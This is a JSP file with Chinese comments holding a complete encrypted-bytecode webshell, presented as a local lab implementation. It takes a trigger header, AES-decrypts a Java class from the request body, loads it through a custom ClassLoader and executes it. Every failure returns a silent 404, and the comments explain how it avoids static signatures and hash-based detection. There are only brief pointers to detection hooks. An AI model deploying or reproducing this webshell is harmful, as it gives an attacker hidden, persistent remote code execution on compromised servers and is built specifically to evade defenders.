<%@ page import="java.util.Base64,javax.crypto.Cipher,javax.crypto.spec.*,java.io.*" %>
<%
/**
 * JSP 加密字节码马（完整实现 / 本地实验环境）
 *
 * ── 形态谱系（免杀梯度）──
 *   ① 关键字变形马：动态类名/字符串拼接——免杀弱，执行逻辑仍在页面
 *   ② 加密通讯马：流量 AES 化——流量隐身，但解密后的执行逻辑仍写在页面里
 *   ③ 字节码马（本实现）：执行体整体外置为 .class——页面只剩"解密+类加载"，静态零逻辑
 *   ④ 表达式驻留（EL/OGNL）：衔接 08 内存马
 *
 * ── 通讯协议 ──
 *   Header  X-K = Base64( IV(16B) || KEY(16B) )     ← 密钥/触发走请求头
 *   Header  X-A = Base64( AES-128-CBC(执行参数) )    ← 可选，解密后传 run(arg)
 *   Body        = Base64( AES-128-CBC( .class 字节码 ) )
 *   执行体契约：类内须有 public static String run(String arg)
 *
 * ── 免杀面 ──
 *   1) 静态：页面零命令关键词；class 字节码解密前只是密文
 *   2) 执行体每次重编译/混淆 → 字节码哈希不重复（样本库无法积累特征）
 *   3) 错误静默：任何异常 → 404，无栈泄漏（不触发容器错误页）
 *
 * 检测侧配对见 NOTES.md；仅本地实验环境使用
 */
String tk = request.getHeader("X-K");
if (tk == null) { response.setStatus(404); return; }          // 无触发头 → 404 静默
try {
    byte[] km = Base64.getDecoder().decode(tk);
    if (km.length != 32) { response.setStatus(404); return; } // 坏密钥材料 → 404
    byte[] iv = new byte[16], key = new byte[16];
    System.arraycopy(km, 0, iv, 0, 16);
    System.arraycopy(km, 16, key, 0, 16);

    // ── 1) 字节码解密（Body）──
    byte[] ct = Base64.getDecoder().decode(readAll(request.getInputStream()));
    Cipher cp = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cp.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
    byte[] cls = cp.doFinal(ct);

    // ── 2) 魔数校验：非 0xCAFEBABE → 404（挡误传与扫描器随机 payload）──
    if (cls.length < 4 || cls[0] != (byte)0xCA || cls[1] != (byte)0xFE
            || cls[2] != (byte)0xBA || cls[3] != (byte)0xBE) {
        response.setStatus(404); return;
    }

    // ── 3) 参数解密（X-A，可选）──
    String arg = "";
    String ta = request.getHeader("X-A");
    if (ta != null) {
        Cipher ca = Cipher.getInstance("AES/CBC/PKCS5Padding");
        ca.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
        arg = new String(ca.doFinal(Base64.getDecoder().decode(ta)), "UTF-8");
    }

    // ── 4) 自定义 ClassLoader：defineClass 公开化 ──
    //        defineClass 默认 protected——子类公开后即可注入任意字节码
    //        检测侧：RASP/JVMTI 挂 defineClass 钩子可捕获本步（见 NOTES）
    class BytecodeLoader extends ClassLoader {
        BytecodeLoader(ClassLoader parent) { super(parent); }
        Class<?> load(byte[] b) { return defineClass(null, b, 0, b.length); }
    }
    Class<?> k = new BytecodeLoader(getClass().getClassLoader()).load(cls);

    // ── 5) 执行运行时类：契约 run(String) → String ──
    Object r = k.getDeclaredMethod("run", String.class).invoke(null, arg);
    out.print(r == null ? "" : r);
} catch (Throwable t) {                                       // 错误静默：任何异常 → 404
    response.setStatus(404);
}
%>
<%!
// 可移植读流（Java 8 无 InputStream.readAllBytes；Java 9+ 可直接替换为内建方法）
private static byte[] readAll(java.io.InputStream in) throws java.io.IOException {
    java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
    byte[] buf = new byte[4096]; int n;
    while ((n = in.read(buf)) != -1) b.write(buf, 0, n);
    return b.toByteArray();
}
%>
